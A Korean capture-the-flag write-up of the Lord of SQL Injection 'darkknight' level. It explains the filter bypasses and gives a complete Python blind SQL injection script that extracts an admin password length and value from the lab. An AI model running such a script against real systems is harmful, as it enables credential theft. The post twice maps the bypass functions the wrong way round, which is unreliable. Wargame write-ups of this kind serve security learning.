---
title: LOS - 12번 darkknight
category: Lord of SQL Injection
---

# [12] darkknight

## 문제

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdN85X8%2Fbtrno40RWs3%2FkoWsihFtPt3Lhk7ku1KN51%2Fimg.png">

## 풀이

필터링 사항은 다음과 같다.


① 싱글쿼터

② substr

③ ascii

④ =


<br>

**substr/ascii 필터링 우회 방법**은 다음과 같다.
 

① substr ⇒ ord

② ascii ⇒ mid

<br> 

또한, 이전 문제와 마찬가지로 admin의 pw를 알아야 풀 수 있는 **Blind SQLi** 문제이다.

기존에 사용했던 자동화 코드에 새로운 필터링 사항을 적용해주면 될 것 같다.

<br> 

다만, 이전과는 달리 파라미터가 두개이므로 (pw, no) 서버측 쿼리문을 잠시 살펴보겠다.

<br> 

준비된 쿼리문은 다음과 같다.

```php
$query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}";
```

<br>

위 쿼리문을 아래와 같이 변조해줄 것이다.

```php
$query = "select id from prob_darkknight where (id='guest' and pw='' and no=0) or id like \"admin\" %26%26 [pw 길이 확인 또는 pw 추출] %23";
```

① id부터 no까지를 하나의 중첩된 and 조건절로 묶어준다.

- 어차피 FALSE로 만드는 것이 목표이기 때문에 pw는 비워두고 no에는 아무 숫자나 할당해준다.

② \|\| id like "admin" && 뒤에 적절한 조건절을 삽입하여 pw 길이 확인 또는 pw 추출을 수행해준다.

 
<br>
 

이상의 내용을 반영하여 자동화 코드의 **check_length()** 를 다음과 같이 수정해준다.

```python
def check_length(url, cookie):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?no=0 || id like \"admin\" %26%26 length(pw)>{num} %23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" not in res.text):
            return num
```

① = ⇒ like (문자열 일치 확인)

② = ⇒ > (ASCII 대소 비교)

- 숫자를 점점 올려가며 비교하기 때문에, 최초로 Hello admin이 뜨지 않는 경우가 곧 아스키가 일치하는 경우이다.

 
<br>
 

다음으로는 **blind_sqli()** 를 다음과 같이 수정해준다.

```python
def blind_sqli(url, cookie, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?no=0 || id like \"admin\" %26%26 ord(mid(pw,{len},1))>{ran} %23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" not in res.text):
                print(f"{len}번째 문자 → {chr(ran)}")
                ans+=chr(ran)
                break
    return ans
```

① substr ⇒ ord

② ascii ⇒ mid

 
<br>
 

**수정된 Python 자동화 코드**의 전문은 다음과 같다.

```python
import requests

def check_length(url, cookie):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?no=0 || id like \"admin\" %26%26 length(pw)>{num} %23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" not in res.text):
            return num

def blind_sqli(url, cookie, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?no=0 || id like \"admin\" %26%26 ord(mid(pw,{len},1))>{ran} %23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" not in res.text):
                print(f"{len}번째 문자 → {chr(ran)}")
                ans+=chr(ran)
                break
    return ans

if __name__ == "__main__":
    print("💘 Blind 공격을 시작합니다")
    
    url=input("URL을 입력하세요:")
    cookie=input("cookie를 알려주세요:")
    
    length=check_length(url, cookie)
    print(f"👏 pw의 길이는 {length}입니다.")
    
    ans=blind_sqli(url, cookie, length)
    print(f"👏 pw의 정체는 {ans}입니다!")
    
    exit
```

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcWiNuI%2FbtrnlqwCc4k%2FHvtf8sJOMAnp84BYeqr9kk%2Fimg.png">

Blind 공격 결과, admin의 pw는 `0b70ea1f` 임을 알 수 있다.

## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FlILVk%2FbtrnjDiSeOV%2FU0OL6DlmSD1nVNdLKX3m8k%2Fimg.png">